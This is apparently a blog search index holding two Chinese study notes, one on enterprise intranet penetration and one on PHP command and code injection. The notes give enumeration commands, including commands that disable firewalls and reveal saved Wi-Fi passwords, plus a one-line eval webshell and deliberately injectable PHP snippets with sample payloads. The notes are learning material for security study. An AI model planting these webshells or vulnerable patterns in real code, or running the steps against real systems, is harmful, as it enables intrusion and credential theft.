<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>内网渗透笔记(持续更新)</title>
    <url>/2020/03/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="企业内网渗透"><a href="#企业内网渗透" class="headerlink" title="企业内网渗透"></a>企业内网渗透</h1><h2 id="1-企业内网基础知识"><a href="#1-企业内网基础知识" class="headerlink" title="1. 企业内网基础知识"></a>1. 企业内网基础知识</h2><h3 id="基本术语"><a href="#基本术语" class="headerlink" title="基本术语"></a>基本术语</h3><ul>
<li>内网：局域网。</li>
<li>工作组：将不同的电脑一般按功能（或部门）分别列入不同的工作组中。</li>
<li>域（domain）：有安全边界的计算机集合<ul>
<li>也可简单的把域理解成升级版的”工作组”，相比于工作组而言，它有更加严格的安全管理控制机制。</li>
</ul>
</li>
<li>域控（Domain Controller,简称DC）是一个域中的一台类似管理服务器的计算机，一般一个域内至少两台域服务器，一个DC另一个备份DC。</li>
<li>单域：在一般的具有固定地理位置的小公司里，建立一个域就足够。</li>
<li>父域：多个域中的第一个域。</li>
<li>子域：多个域中除父域外的域。</li>
<li>域树：若干个域通过建立信任关系组成的集合，一个域管理员只能管理本域的内部，不能访问或者管理其他域，两个域之间相互访问则需要建立信任关系（Trust Relation）。</li>
<li>信任关系：连接不同域之间的桥梁。</li>
<li>域名：在一个域树中，父域可以包含很多子域，子域是相对于父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</li>
<li>DNS域名服务器：进行域名和与之对应IP地址转换的服务器，通常DNS服务器和域控制器会处于同一台机器上。</li>
<li>活动目录（Active Directory）：是域环境提供目录服务的组件，一般在域控（DC）上。<ul>
<li>活动目录和工作组是基于WINDOWS的局域网中两种不同的网络管理模式；<ul>
<li>工作组以计算机为管理单元，各计算机管理员身份的用户在资源共享上具有自主。一般是小型网络采取这种组建模式居多。</li>
<li>活动目录是大中型网络的管理模式，是典型的以用户为单位的管理模式。<h2 id="2-企业内网渗透思路"><a href="#2-企业内网渗透思路" class="headerlink" title="2. 企业内网渗透思路"></a>2. 企业内网渗透思路</h2></li>
</ul>
</li>
</ul>
</li>
<li>思路主要有两种（主要讲第一种）：<ol>
<li>攻击外网服务器，获得权限，当作跳板进而攻击内网服务器；</li>
<li>攻击办公网的系统，办公网电脑，办公网无线等方式，一般采用社工，实现控制办公电脑，再控制各种服务器。</li>
</ol>
</li>
<li>一般内网安全检查使用第一种思路，实际攻击两种思路结合<h2 id="3-企业内网敏感资料-数据-信息："><a href="#3-企业内网敏感资料-数据-信息：" class="headerlink" title="3. 企业内网敏感资料/数据/信息："></a>3. 企业内网敏感资料/数据/信息：</h2></li>
<li>高管/系统管理员/财务/人事/业务人员的个人电脑</li>
<li>文件服务器/共享服务器</li>
<li>邮件服务器</li>
<li>OA服务器</li>
<li>数据库服务器<h2 id="4-攻击过程"><a href="#4-攻击过程" class="headerlink" title="4. 攻击过程"></a>4. 攻击过程</h2><h3 id="4-1-信息收集"><a href="#4-1-信息收集" class="headerlink" title="4.1. 信息收集"></a>4.1. 信息收集</h3><h4 id="4-1-1-手工收集"><a href="#4-1-1-手工收集" class="headerlink" title="4.1.1 手工收集"></a>4.1.1 手工收集</h4></li>
<li>网络配置信息<br>  ip网关信息查询<code>ipconfig /all</code>||<code>ip add、ifconfig</code><br>  dns服务器查询<code>nslookup</code></li>
<li>操作系统机软件信息<ul>
<li>操作系统和版本信息<ul>
<li><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C &quot;OS Version&quot;</code></li>
<li><code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code></li>
<li>linux:<code>uname -a</code></li>
</ul>
</li>
<li>安装的软件及版本<ul>
<li><code>wmic product get name,version</code></li>
<li><code>powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code></li>
<li>linux:<code>rpm -qa</code></li>
</ul>
</li>
<li>查询本机服务<ul>
<li><code>wmic service list brief</code></li>
<li>linux:<code>service –status -all</code></li>
</ul>
</li>
<li>查询进程列表<ul>
<li><code>tasklist</code></li>
<li>linux<code>ps aux、ps -ef、top</code></li>
</ul>
</li>
<li>查看进程信息<ul>
<li><code>wmic process list brief</code></li>
<li>常见的杀毒软件的进程：<br>  360sd.exe    360杀毒<br>  360tray.exe    360实时保护<br>  ZhuDongFangYu.exe    360主动防御<br>  KSafeTray.exe    金山卫士<br>  SafeDogUpdateCenter.exe    服务器安全狗<br>  McAfee McShield.exe    McAfee<br>  AVP.EXE    卡巴斯基<br>  avguard.exe    小红伞<br>  bdagent.exe    BitDefender</li>
<li>linux<code>ps aux、ps -ef、top</code></li>
</ul>
</li>
<li>查看启动程序信息<ul>
<li><code>wmic startup get command,caption</code></li>
<li>linux:<code>chkconfig --list</code></li>
</ul>
</li>
<li>查看用户列表、当前权限<ul>
<li><code>net user、whoami、net user 用户名、echo %username%</code></li>
<li><code>who、whoami、cat /etc/passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F&quot;:&quot; &#39;{ print $1&quot;|&quot;$3&quot;|&quot;$4 }&#39;|more</code></li>
</ul>
</li>
<li>获取本地管理员信息<ul>
<li><code>net localgroup administrators</code></li>
</ul>
</li>
<li>查看在线用户(win server 2008)<ul>
<li><code>query user || qwinsta</code></li>
<li>Linux:<code>w</code></li>
</ul>
</li>
<li>端口列表<ul>
<li><code>netstat -ano</code></li>
<li>Linux:<code>netstat -ntulp</code></li>
</ul>
</li>
<li>系统详细信息<ul>
<li><code>systeminfo</code></li>
</ul>
</li>
<li>安装补丁信息<ul>
<li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li>
<li><code>wmic qfe list full</code></li>
</ul>
</li>
<li>本机共享列表<ul>
<li><code>net share</code></li>
<li><code>wmic share get name,path,status</code></li>
<li>Linux:<code>smbclient -L //IP [-U 用户名]</code></li>
</ul>
</li>
<li>路由表<ul>
<li><code>route print</code></li>
<li>Linux:<code>route -n</code></li>
</ul>
</li>
<li>arp缓存<ul>
<li><code>arp -a</code> linux一样</li>
</ul>
</li>
<li>防火墙配置<ul>
<li><code>netsh firewall show config</code></li>
<li><code>netsh advfirewall set allprofiles state off</code>  —关闭防火墙,需要管理员身份</li>
<li>Linux:<code>firewall-cmd --state</code></li>
<li>Linux:<code>systemctl stop firewalld.service</code></li>
</ul>
</li>
<li>内网网络信息，无线网络<ul>
<li><code>netsh wlan show profiles</code></li>
<li><code>netsh wlan show profile name=“网络链接配置文件” key=clear</code> –查看wifi密码</li>
<li><code>ls /etc/NetworkManager/system-connections</code></li>
<li><code>cat /etc/NetworkManager/system-connections/wifi配置文件</code><h4 id="4-1-2-脚本-工具收集"><a href="#4-1-2-脚本-工具收集" class="headerlink" title="4.1.2 脚本/工具收集"></a>4.1.2 脚本/工具收集</h4><h5 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h5><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-2-漏洞验证-漏洞攻击"><a href="#4-2-漏洞验证-漏洞攻击" class="headerlink" title="4.2. 漏洞验证/漏洞攻击"></a>4.2. 漏洞验证/漏洞攻击</h3><h3 id="4-3-后渗透"><a href="#4-3-后渗透" class="headerlink" title="4.3. 后渗透"></a>4.3. 后渗透</h3><h3 id="4-4-日志清理"><a href="#4-4-日志清理" class="headerlink" title="4.4. 日志清理"></a>4.4. 日志清理</h3>]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/2020/03/12/RCE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RCE：命令执行漏洞"><a href="#RCE：命令执行漏洞" class="headerlink" title="RCE：命令执行漏洞"></a>RCE：命令执行漏洞</h1><h2 id="1-命令注入"><a href="#1-命令注入" class="headerlink" title="1.命令注入"></a>1.命令注入</h2><ul>
<li>系统命令执行函数引用了用户可控变量且未进行过滤,注入恶意系统命令，可以使用命令连接符：|，||，&amp;，&amp;&amp;</li>
<li>常见函数：<pre><code>php中的 `exec(),system(),passthru(),shell_exec()...`</code></pre></li>
</ul>
<hr>
<h2 id="2-代码注入"><a href="#2-代码注入" class="headerlink" title="2.代码注入"></a>2.代码注入</h2><ul>
<li><p>代码注入函数引用了用户可控变量且未进行过滤，注入恶意脚本代码，常用的一句话木马就是人为生产的代码注入漏洞</p>
</li>
<li><p>常见函数</p>
<pre><code>php中的 `assert(),eval(),preg_replace(),create_function(),array_map(),call_user_func(),call_user_func_array()...`</code></pre><ul>
<li><p>案例1</p>
<p>  <code>eval()</code>函数:将字符串作为php代码执行，常见的一句话木马：<code>&lt;?php eval($_POST[cmd]);?&gt;</code>cmd就是一句话木马的密码。</p>
</li>
<li><p>案例2</p>
<p>  <code>assert()</code>动态函数，<code>php代码：&lt;?php
  $_GET[0]($_REQUEST[1]);
  ?&gt;,  payload:?0=assert&amp;1=phpinfo()</code>,此处assert不可替换成eval,因为assert是动态函数，其中菜刀连接的链接为<code>http://ip/RCE/index.php?0=assert</code>,密码为 <code>1</code></p>
</li>
<li><p>案例3</p>
<p>  <code>preg_replace()</code>执行一个正则表达式的搜索和替换，如果正则表达式中有e修正符，则第二个参数的字符串当作php代码执行<code>&lt;?php echo preg_replace(&quot;/test/e&quot;,$_POST[cmd],&quot;something test&quot;);?&gt;</code><br>  cmd就是一句话木马的密码。</p>
</li>
<li><p>案例4 </p>
<p>  <code>creat_function()</code><br>  php代码</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$code &#x3D; $_REQUEST[cmd];</span><br><span class="line">$str &#x3D; &#39;echo test&#39;.$code.&quot;;&quot;;</span><br><span class="line">$x&#x3D;create_function(&#39;$code&#39;,$str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  payload:<code>http://ip/RCE/index.php?cmd=1;}phpinfo();/*</code>注意闭合<code>creat_function()</code>函数</p>
</li>
<li><p>案例5</p>
<p>  <code>array_map()</code><br>  php代码</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$eval_func&#x3D;$_REQUEST[func];</span><br><span class="line">$eval_cmd &#x3D; $_REQUEST[cmd];</span><br><span class="line">$arr[0]&#x3D;$eval_cmd;</span><br><span class="line">$new_arr &#x3D; array_map($eval_func,$arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  payload:<code>http://ip/RCE/index.php?func=system&amp;cmd=whoami</code></p>
</li>
<li><p>案例6</p>
<p>  <code>call_user_func()</code><br>  php代码</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$eval_func&#x3D;$_REQUEST[func];</span><br><span class="line">$eval_cmd &#x3D; $_REQUEST[cmd];</span><br><span class="line">call_user_func($eval_func,$eval_cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  payload:<code>http://ip/RCE/index.php?func=system&amp;cmd=whoami</code></p>
</li>
<li><p>案例7</p>
<p>  <code>call_user_func_array()</code><br>  php代码</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$eval_func&#x3D;$_REQUEST[func];</span><br><span class="line">$eval_cmd &#x3D; $_REQUEST[cmd];</span><br><span class="line">call_user_func_array($eval_func,array($eval_cmd));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  payload:<code>http://ip/RCE/index.php?func=system&amp;cmd=whoami</code></p>
</li>
</ul>
</li>
</ul>
<hr>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
</search>
